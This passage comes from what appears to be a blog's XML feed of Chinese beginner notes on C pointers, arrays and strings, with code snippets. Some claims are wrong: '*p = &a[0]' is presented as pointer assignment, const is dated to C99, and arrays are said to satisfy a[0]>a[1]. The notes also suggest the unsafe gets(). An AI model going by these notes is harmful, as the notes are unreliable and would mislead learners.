class="keyword">int</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a, b;</span><br><span class="line">    a = <span class="number">1</span>;</span><br><span class="line">    b = <span class="number">2</span>;</span><br><span class="line">    swap(&amp;a, &amp;b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d, b=%d&quot;</span>, a, b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *pa, <span class="keyword">int</span> *pb)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pa=%p,pb=%p\n&quot;</span>, pa, pb);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;*pa=%d,*pb=%d\n&quot;</span>, *pa, *pb);</span><br><span class="line">    t = *pa;</span><br><span class="line">    *pa = *pb;</span><br><span class="line">    *pb = t;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pa=%p,pb=%p\n&quot;</span>, pa, pb);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;*pa=%d,*pb=%d\n&quot;</span>, *pa, *pb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="场景2"><a href="#场景2" class="headerlink" title="场景2"></a>场景2</h3><p>1.函数返回运算状态，指针返回结果</p><p>2.当要返回的值多个都是有效的结果时，要分开返回了</p><h3 id="p和p"><a href="#p和p" class="headerlink" title="*p和p"></a>*p和p</h3><ul><li><code>*p</code>是常量，<code>p</code>是变量</li></ul><h2 id="指针与数组"><a href="#指针与数组" class="headerlink" title="指针与数组"></a>指针与数组</h2><p><strong>注意：</strong>函数<strong>参数表的数组</strong>其实就是<strong>指针</strong></p><ul><li>以下四种函数原型是等价的<ul><li><code>int sum(int *a, int b)</code></li><li><code>int sum(int*, int)</code></li><li><code>int sum(int a[], int b)</code></li><li><code>int sum(int [], int)</code></li></ul></li></ul><blockquote><p><strong>数组就是特殊的指针</strong></p></blockquote><ul><li><code>[]</code>对指针和数组都可以用，同理<code>*</code>也一样</li></ul><blockquote><p>因为<code>int a[]&lt;==&gt;int *const a=</code> </p><p>所以这里不能被赋值</p><p>如<code>a = b;//error</code></p></blockquote><h3 id="一维数组指针"><a href="#一维数组指针" class="headerlink" title="一维数组指针"></a>一维数组指针</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> *p;</span><br><span class="line">*p = &amp;a[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><blockquote><p>在C语言中规定<strong>数组名</strong>代表数组中的<strong>首地址</strong>(声明函数的参数不是,他不占实际内存单元)</p></blockquote><p>实际上<code>p=&amp;a[0]</code>与<code>p=a</code>一样</p><ul><li>但是数组的<strong>单元</strong>表达的是<strong>变量</strong>，需要<code>&amp;</code>取地址<ul><li>意思是把数组的<strong>首地址</strong>赋给p</li></ul></li></ul><p><code>p+1</code>实际是<code>p+1*d</code>，<code>d</code>代表<strong>字节数</strong></p><p>综上，引用数组元素的方法有</p><ul><li><strong>下标</strong>法:<code>a[0]或p[0];</code></li><li><strong>指针</strong>法:<code>*(a+i)</code>或者<code>*(p+i);</code></li></ul><blockquote><p>a是数组的首地址，即指针常量</p></blockquote><ul><li>因为数组元素也是内存变量，所以<strong>此类指针的定义和使用</strong>和<strong>指向变量的指针变量</strong>相同.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a[<span class="number">10</span>] *p;</span><br><span class="line">p = a;</span><br></pre></td></tr></table></figure><ul><li>此时<code>p</code>指向<code>a[0]</code>，下面可以用<code>p</code>表示数组元素.<ul><li>下标表示:</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p[<span class="number">0</span>],p[<span class="number">1</span>],...<span class="comment">//需要定义指针数组</span></span><br></pre></td></tr></table></figure><ul><li>指针表示法:</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(p+<span class="number">0</span>),...</span><br></pre></td></tr></table></figure><ul><li>注意：使用指针变量引用数据时，必须关注当前值<ul><li>比如：若<code>p=p+3</code>，则<code>p[0]</code>代表<code>a[4]</code></li></ul></li></ul><h3 id="二维数组指针"><a href="#二维数组指针" class="headerlink" title="二维数组指针"></a>二维数组指针</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>  a[<span class="number">3</span>][<span class="number">4</span>];</span><br></pre></td></tr></table></figure><ul><li><p><code>a</code>是首地址</p></li><li><p>三个行元素的地址分别是:<code>a,a+1,a+2</code>且<code>a[0],a[1],a[2]</code>也是地址量，即<code>*(a+0),*(a+1),*(a+2)</code>是一维数组的首个元素的地址</p></li></ul><p>每个元素的地址<code>&amp;a[i][j],a[i]+j,*(a+i)+j</code>都可以表示</p><p>元素的表示<code>a[i][j],*(a[i]+j),*(*(a+i)+j)</code>可以表示</p><blockquote><p>要使用这两种方法引用元素的前提是二维数组全赋给指针数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>  (*p)[<span class="number">3</span>], a[<span class="number">2</span>][<span class="number">3</span>];</span><br><span class="line">p = a;</span><br></pre></td></tr></table></figure><p><strong>注意:</strong><code>()</code>不能去掉，因为<code>[ ]</code>的优先级高于<code>()</code></p><ul><li>意思是一个指向二维数组的指针，<strong>只占int的字节数</strong></li></ul><p><code>type *p[num</code>]的意思是一组指针，每个元素保存一个指针</p></blockquote><ul><li>等价关系<ul><li><code>a+i == p+i</code></li><li><code>a[i] == p[i] == *(a+i) == *(p+i)</code></li><li><code>a[i][j] == p[i][j] == *(a[i]+j) == *(p[i]+j) == *(*(a+i)+j) == *(*(p+i)+j)</code></li></ul></li></ul><p>说明:</p><ul><li>​    赋给指针时首地址是<code>a[0]</code>，<code>**a</code>表示<code>a[0][0]</code></li></ul><h2 id="初始化的方法"><a href="#初始化的方法" class="headerlink" title="初始化的方法"></a>初始化的方法</h2><p>方法一</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> a[] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> *pa = &amp;a[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>方法二</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> a[] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> *pa;</span><br><span class="line">pa = &amp;a[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>错误表达</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> a[] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> *pa;</span><br><span class="line">*pa = &amp;a[<span class="number">0</span>];<span class="comment">//Error!</span></span><br></pre></td></tr></table></figure><h2 id="算术操作及比较"><a href="#算术操作及比较" class="headerlink" title="算术操作及比较"></a>算术操作及比较</h2><ul><li><p>只可以作加减法</p><ul><li><p><code>p+n</code>指的是<code>p</code>指向的数据单元之后的第<code>n</code>个数据单元</p><ul><li><p><code>int *p;</code>(设<code>p</code>的初始值是<code>2000</code>)</p><p><code>p+1;</code>表示<code>2002</code></p></li></ul></li></ul></li><li><p>指针值的比较（<code>&lt;,&lt;=,&gt;,&gt;=,==,!=</code>）</p><ul><li><p>前提条件：<code>p1</code>和<code>p2</code>是同一类型的指针变量，并且都指向同一段连续的储存空间</p></li><li><p>则<code>p1&lt;p2</code>为真的话结果是1，否则是0</p></li></ul></li><li><p>数组是递增排列的，<code>a[0]&gt;a[1]</code></p></li></ul><h2 id="CONST"><a href="#CONST" class="headerlink" title="CONST"></a>CONST</h2><p>1.<strong>只有C99</strong>以后的支持</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> * <span class="keyword">const</span> q = &amp;a;</span><br></pre></td></tr></table></figure><ul><li>此时<code>q</code>被<strong>固定</strong>，<code>q++</code>不能实现；</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> *q = &amp;a;</span><br><span class="line"><span class="keyword">int</span> <span class="keyword">const</span>* q = &amp;a；</span><br></pre></td></tr></table></figure><ul><li><code>q</code>可以被赋地址，但<code>*q</code>不能被赋值</li></ul><p>2.非<code>const</code>转换为<code>const</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">针<span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>* x)</span></span>;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">15</span>;</span><br><span class="line">f(&amp;a);  <span class="comment">//ok</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> b = a;</span><br><span class="line">f(&amp;b);  <span class="comment">//ok</span></span><br><span class="line">b = a + <span class="number">1</span>;  <span class="comment">//error</span></span><br></pre></td></tr></table></figure><ul><li>适用于传递的参数类型比地址大时</li></ul><p>3.<code>const</code>数组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> a[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br></pre></td></tr></table></figure><p>此时每个单元都是<code>const</code>，</p><p>只能通过初始化赋值，</p><p>因为把数组传入函数时是地址，所以函数可以修改数组的值</p><blockquote><p>为了保护数组不被破环，可以设置参数为<code>const</code></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> a[ ] )</span></span>;</span><br></pre></td></tr></table></figure><h2 id="0地址"><a href="#0地址" class="headerlink" title="0地址"></a>0地址</h2><ul><li><p>通常<code>0</code>地址不能乱碰</p></li><li><p>你的指针不应该有0值</p></li><li><p><code>0</code>地址可以来表示特殊的事情</p><ul><li>返回的指针是无效的</li><li>指针没有真正初始化</li></ul></li><li><p><code>NULL</code>是一个预定的符号，表示<code>0</code>地址</p></li><li><p>一般用<code>NULL</code>表示<code>0</code>地址</p></li></ul><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ul><li><p>传入较大的数据时用作<strong>参数</strong></p></li><li><p>传入数组后对数组进行<strong>操作</strong></p></li><li><p>返回多个结果</p><ul><li>修改多个变量</li></ul></li><li><p>动态申请内存 </p></li></ul>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>简单理解数组</title>
      <link href="/Programming/C/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%95%B0%E7%BB%84.html"/>
      <url>/Programming/C/%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3%E6%95%B0%E7%BB%84.html</url>
      
        <content type="html"><![CDATA[<h2 id="使用数组的原因"><a href="#使用数组的原因" class="headerlink" title="使用数组的原因"></a>使用数组的原因</h2><p>为了方便处理更多的数据</p><span id="more"></span><h2 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h2><p>数组长度可以这样表示：<code>sizeof(a) / sizeof(a[0])</code><strong><u>在数组作为函数参数时不行</u></strong></p><p>因为在函数参数表内：<code>sizeof(a) == sizeof(type* )</code></p><h3 id="定义格式"><a href="#定义格式" class="headerlink" title="定义格式"></a>定义格式</h3><p><code>类型 数组名[元数个数]</code><br>1.名字遵循规范</p><p>2.元数个数一般是常量 (整数)，不能是变量 //二级考试，实际上c99，c11已经支持变量  </p><p>3.<strong>内存大小=元素类型*元素个数</strong></p><p>4.一旦定义，不能改变</p><h3 id="数组的初始化"><a href="#数组的初始化" class="headerlink" title="数组的初始化"></a>数组的初始化</h3><p>1.<code>数组类型  名称[n]=&#123;0,....n-1&#125;;</code></p><p>2.给特定元素赋值,其他默认是<code>0</code>，如果两个特定元素中间有元素，必须把<code>0</code>补上</p><p>3.<code>数组类型  名称[ ]=&#123;0,....n&#125;;</code></p><p>不写个数,由写的元素来定个数;<br>4.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>  a[<span class="number">10</span>] = &#123;</span><br><span class="line">    [<span class="number">0</span>] = <span class="number">2</span>, [<span class="number">3</span>] = <span class="number">3</span>, <span class="number">4</span>,  <span class="comment">//表示[4] = 4</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//c99才有用</span></span><br></pre></td></tr></table></figure><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p><code>数组名[下标]</code></p><ul><li><p>数组变量本身不能被赋值</p></li><li><p>要把数组所有元素交给另一个数组，<strong>必须采用遍历</strong>（区分结构体）</p></li><li><p>下标为整型常量或整型表达式</p></li><li><p>只能逐个引用数组（<strong>遍历</strong>）</p></li><li><p>编译器和运行环境都不会检查越界问题，虽然有时候也不会出错</p><ul><li><code>windows</code>会提示<code>segmentation fault</code></li><li>特例:定义<code>a[0]</code>存在，但无用</li></ul></li><li><p>特点:个数是<code>n</code>，实际上是<code>0,1,2,.....n-1</code></p><ul><li>与储存格式与c语言有关，储存时会有一个首地址，第一个数据会直接存到首地址中，第二个数据存到<code>首地址+类型字节*i</code>中i本该是2，在C语言中是1，不然会增加运算量，但其他语言可以</li></ul></li></ul><h2 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h2><h3 id="定义格式-1"><a href="#定义格式-1" class="headerlink" title="定义格式"></a>定义格式</h3><p><code>类型  数组名[常量表达式1][常量表达式2]</code></p><ul><li><p>说明：表达式1表示行，2表示列</p></li><li><p>存放顺序：按行从左到右依次</p></li></ul><h3 id="引用格式"><a href="#引用格式" class="headerlink" title="引用格式"></a>引用格式</h3><p><code>数组名[下标][下标]</code></p><ul><li>下标可以是常量或者整型表达式</li></ul><h3 id="初始化格式"><a href="#初始化格式" class="headerlink" title="初始化格式"></a>初始化格式</h3><h4 id="1-分段赋值"><a href="#1-分段赋值" class="headerlink" title="1.分段赋值"></a>1.分段赋值</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> score[<span class="number">5</span>][<span class="number">3</span>] = &#123;</span><br><span class="line">  &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;,</span><br><span class="line">  &#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>,&#125;,...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-连续赋值"><a href="#2-连续赋值" class="headerlink" title="2.连续赋值"></a>2.连续赋值</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> score[<span class="number">5</span>][<span class="number">3</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6.</span>..&#125;</span><br></pre></td></tr></table></figure><h4 id="3-给部分元素赋值"><a href="#3-给部分元素赋值" class="headerlink" title="3.给部分元素赋值"></a>3.给部分元素赋值</h4><ul><li><p>其他自动取0</p></li><li><p>或者全部赋值，但一维的长度不给出</p></li></ul><p>如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> score[][<span class="number">3</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="遍历数组"><a href="#遍历数组" class="headerlink" title="遍历数组"></a>遍历数组</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">-1</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> *pa = &amp;a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//1.普通方法</span></span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(a)/<span class="keyword">sizeof</span>(a[<span class="number">0</span>]); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="comment">//2.在数组后面添加一个-1，利用指针输出，结束</span></span><br><span class="line">    <span class="keyword">while</span> ( *pa != <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\t&quot;</span>, *pa++);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="字符串数组"><a href="#字符串数组" class="headerlink" title="字符串数组"></a>字符串数组</h2><p><strong>使用时注意初始化！</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *a[]=&#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> *a[]=&#123;<span class="number">0</span>&#125;;</span><br></pre></td></tr></table></figure><h3 id="指向字符串的指针变量"><a href="#指向字符串的指针变量" class="headerlink" title="指向字符串的指针变量"></a>指向字符串的指针变量</h3><ul><li>c语言中对字符常量的处理是按照<strong>字符数组</strong>来处理的</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>  *cp;</span><br><span class="line">cp=<span class="string">&quot;love&quot;</span>; <span class="comment">//初始化</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;储存的内容:%s\n&quot;</span>, cp );</span><br></pre></td></tr></table></figure><p>说明：</p><ul><li><p>实际上字符串的第一个元素的地址赋给<code>cp</code></p></li><li><p>系统先输出首字符，然后指针自动<code>+1</code>，继续输出，直到碰到<code>\0</code></p></li><li><p>因为c语言中没有字符变量，所以存放字符串用<strong>字符数组</strong></p></li></ul><h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> name[];</span><br></pre></td></tr></table></figure><ul><li>初始化同一维数组</li></ul><p>如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> i[] = &#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;d&#x27;</span>&#125;<span class="comment">//此时数组长度为3</span></span><br></pre></td></tr></table></figure><ul><li>c语言允许用字符串的形式给数组赋值；此时c语言默认字符串以<code>\0</code>结尾，会用一个字节来存放<code>\0</code></li></ul><p>如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> i[] = <span class="string">&quot;china&quot;</span>;<span class="comment">//注意此时数组长度为6</span></span><br></pre></td></tr></table></figure><ul><li><p>输出格式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, i);</span><br></pre></td></tr></table></figure></li></ul><p>定义为字符类型时<code>scanf</code>输入的字符中不能带空格，空格后面的东西不会被赋值。</p><p>并且，由于指针的原因，输入格式为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,name);<span class="comment">//不需要&amp;</span></span><br></pre></td></tr></table></figure><ul><li><p>字符串输出(在<code>stdio.h</code>里)：<code>puts(name);</code></p></li><li><p>输入：<code>gets(name);</code></p><ul><li>有点小问题，需要和<code>getchar()</code>搭配使用</li><li>空格不会使输入结束，只有回车可以</li></ul></li></ul><h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><h4 id="字符串常量"><a href="#字符串常量" class="headerlink" title="字符串常量"></a>字符串常量</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* s = <span class="string">&quot;Hello, world!&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>s是一个指针，初始化为指向一个字符串常量<ul><li>由于这个常量所在的地方，实际上<code>s</code>是<code>const char* s</code>，但由于历史的原因，编译器接受不带const的写法</li><li>但是师徒对s所指的字符串做写入会导致严重的后果</li></ul></li><li>如果需要修改字符串，应该用数组：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> s[] = <span class="string">&quot;hello world&quot;</span>;</span><br></pre></td></tr></table></figure><h4 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *<span class="built_in">string</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, <span class="built_in">string</span>);</span><br></pre></td></tr></table></figure><ul><li>以为<code>char*</code>是字符串类型，定义了一个字符串类型的变量<code>string</code>就可以直接使用了<ul><li>由于没有对<code>string</code>初始化为0，所以不一定每次运行都出错</li></ul></li></ul><h4 id="指针还是数组？"><a href="#指针还是数组？" class="headerlink" title="指针还是数组？"></a>指针还是数组？</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *str = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> word[] = <span class="string">&quot;hello&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>数组：这个字符串在这里<ul><li>作为本地变量空间自动被回收</li></ul></li><li>指针：这个字符串不知道在哪里<ul><li>用来处理参数</li><li>动态分配空间</li></ul></li><li>要构造一个字符串用数组，处理用指针</li></ul><h4 id="char-是字符串？"><a href="#char-是字符串？" class="headerlink" title="char*是字符串？"></a>char*是字符串？</h4><ul><li><p>字符串可以表达为<code>char*</code>的形式</p></li><li><p><code>char*</code>不一定是字符串</p><ul><li>本意是指向字符的指针，可能指向的是字符的数组（<code>int*</code>）</li><li>只有它所指的字符数组有结尾的0，才能说它所指的是字符串</li></ul></li><li><p>字符串的赋值实际上是把指针指向了那个值，并没有创造新的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> a[<span class="number">10</span>] = <span class="string">&quot;&quot;</span>;<span class="comment">//表示一个空的字符串，a[0]=&quot;\0&quot;</span></span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">&quot;&quot;</span>;<span class="comment">//这个数组的长度只有1</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>char  a[][10 ];!=char  *a[];</code></p><p><code>char (*a)[10];</code></p><h4 id="初始指针字符数组的方法"><a href="#初始指针字符数组的方法" class="headerlink" title="初始指针字符数组的方法"></a>初始指针字符数组的方法</h4><p><code>char *a[]=&#123;NULL&#125;;</code></p><p><code>char *a[]=&#123;0&#125;;</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *a[ ] = &#123;</span><br><span class="line"><span class="string">&quot;January&quot;</span>,</span><br><span class="line"><span class="string">&quot;February&quot;</span>,</span><br><span class="line"><span class="string">&quot;March&quot;</span>,</span><br><span class="line"><span class="string">&quot;April&quot;</span>,</span><br><span class="line"><span class="string">&quot;May&quot;</span>,</span><br><span class="line"><span class="string">&quot;June&quot;</span>,</span><br><span class="line"><span class="string">&quot;july&quot;</span>,</span><br><span class="line"><span class="string">&quot;August&quot;</span>,</span><br><span class="line"><span class="string">&quot;September&quot;</span>,</span><br><span class="line"><span class="string">&quot;October&quot;</span>,</span><br><span class="line"><span class="string">&quot;November&quot;</span>,</span><br><span class="line"><span class="string">&quot;December&quot;</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>a[]</code>存了每个字符常量的首地址</p>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言基础</title>
      <link href="/Programming/C/C.html"/>
      <url>/Programming/C/C.html</url>
      
        <content type="html"><![CDATA[<p>这是我的入门语言，自己学得不是很好，也用的不多</p><span id="more"></span><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&quot;stdio.h&quot;</span><span class="comment">//函数库</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span><span class="comment">//圆括号里为参数，main前面为类型，为main返回值类型 ，大括号是函数体 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> mychar=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="built_in">putchar</span>(mychar);</span><br><span class="line">    mychar=getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; 